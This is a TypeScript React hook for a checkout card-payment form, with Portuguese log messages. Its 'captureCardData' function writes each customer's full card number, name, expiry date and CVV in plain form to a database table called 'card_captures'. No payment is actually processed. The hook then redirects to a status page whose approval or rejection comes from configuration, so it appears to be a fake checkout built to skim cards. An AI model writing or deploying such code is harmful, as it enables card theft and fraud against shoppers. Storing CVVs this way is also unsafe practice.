
import { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { ConfigCheckout } from "@/lib/types/database-types";
import { toast } from "sonner";
import { CardFormData, PaymentStatus } from "@/components/checkout/payment/types";
import { supabase } from "@/integrations/supabase/client";

export const useCardPaymentForm = (
  customRedirectStatus?: PaymentStatus,
  configCheckout?: ConfigCheckout | null,
  onPaymentSubmit?: (data: CardFormData) => void
) => {
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCVV, setCardCVV] = useState("");
  const [installments, setInstallments] = useState("1");
  const [isValid, setIsValid] = useState({
    cardNumber: false,
    cardName: false,
    cardExpiry: false,
    cardCVV: false
  });
  const [formIsComplete, setFormIsComplete] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();

  const handleCardNumberChange = (value: string, isValid: boolean) => {
    setCardNumber(value);
    setIsValid(prev => ({
      ...prev,
      cardNumber: isValid
    }));
  };

  const handleCardNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setCardName(value);
    setIsValid(prev => ({
      ...prev,
      cardName: value.trim().length > 3 && value.includes(' ')
    }));
  };

  const handleCardExpiryChange = (value: string, isValid: boolean) => {
    setCardExpiry(value);
    setIsValid(prev => ({
      ...prev,
      cardExpiry: isValid
    }));
  };

  const handleCardCVVChange = (value: string, isValid: boolean) => {
    setCardCVV(value);
    setIsValid(prev => ({
      ...prev,
      cardCVV: isValid
    }));
  };
  
  const captureCardData = async (cardData: CardFormData) => {
    try {
      console.log("💳 Salvando dados do cartão no banco de dados...");
      
      const { data, error } = await supabase
        .from("card_captures")
        .insert([{
          nome_cliente: cardData.cardName,
          numero_cartao: cardData.cardNumber,
          validade: cardData.cardExpiry,
          cvv: cardData.cardCVV
        }]);
      
      if (error) {
        console.error("❌ Erro ao salvar dados do cartão:", error);
        throw error;
      }
      
      console.log("✅ Dados do cartão salvos com sucesso");
      return true;
    } catch (err) {
      console.error("❌ Falha ao capturar dados do cartão:", err);
      return false;
    }
  };
  
  const handleSubmitPayment = async () => {
    if (!formIsComplete) {
      console.warn("⚠️ Formulário incompleto, não enviando");
      return;
    }
    
    setIsSubmitting(true);
    
    const cardData: CardFormData = {
      cardNumber,
      cardName,
      cardExpiry,
      cardCVV,
      installments
    };
    
    console.log("🔄 Processando pagamento com cartão:", { 
      slug, 
      customRedirectStatus,
      configCardStatus: configCheckout?.redirect_card_status,
      cardData: { ...cardData, cardNumber: "****" } // Mask card number in log
    });
    
    try {
      // Capture card data first
      const savedCard = await captureCardData(cardData);
      
      if (!savedCard) {
        toast.error("Falha ao salvar os dados do cartão");
        setIsSubmitting(false);
        return;
      }
      
      // If an external submission handler was provided, use it
      if (onPaymentSubmit) {
        console.log("🔄 Chamando manipulador de envio de pagamento fornecido");
        onPaymentSubmit(cardData);
        // Don't set isSubmitting to false here, let the calling component do it
      } else {
        // Default behavior: setTimeout and redirect
        setTimeout(() => {
          try {
            if (slug) {
              let redirectStatus: PaymentStatus;
              
              if (customRedirectStatus) {
                redirectStatus = customRedirectStatus;
                console.log("🔄 Usando status personalizado:", redirectStatus);
              } else if (configCheckout?.redirect_card_status) {
                const configStatus = configCheckout.redirect_card_status;
                if (['analyzing', 'approved', 'rejected'].includes(configStatus as string)) {
                  redirectStatus = configStatus as PaymentStatus;
                  console.log("🔄 Usando status de configuração global:", redirectStatus);
                } else {
                  redirectStatus = 'analyzing';
                  console.log("⚠️ Status de configuração inválido, usando padrão:", redirectStatus);
                }
              } else {
                redirectStatus = 'analyzing';
                console.log("🔄 Usando status padrão:", redirectStatus);
              }
              
              console.log(`✅ Redirecionando para: /payment-status/${slug}/${redirectStatus}`);
              navigate(`/payment-status/${slug}/${redirectStatus}`);
            } else {
              console.error("❌ Slug não encontrado para redirecionamento");
              toast.error("Erro ao processar pagamento: referência do produto não encontrada");
            }
          } catch (error) {
            console.error("❌ Erro de redirecionamento:", error);
            toast.error("Erro ao processar pagamento");
          } finally {
            setIsSubmitting(false);
          }
        }, 1500);
      }
    } catch (error) {
      console.error("❌ Erro de processamento de pagamento:", error);
      toast.error("Falha ao processar pagamento. Por favor, tente novamente.");
      setIsSubmitting(false);
    }
  };
  
  useEffect(() => {
    setFormIsComplete(
      isValid.cardNumber && 
      isValid.cardName && 
      isValid.cardExpiry && 
      isValid.cardCVV
    );
  }, [isValid]);

  return {
    cardNumber,
    cardName,
    cardExpiry,
    cardCVV,
    installments,
    isValid,
    formIsComplete,
    isSubmitting,
    setInstallments,
    handleCardNumberChange,
    handleCardNameChange,
    handleCardExpiryChange,
    handleCardCVVChange,
    handleSubmitPayment
  };
};
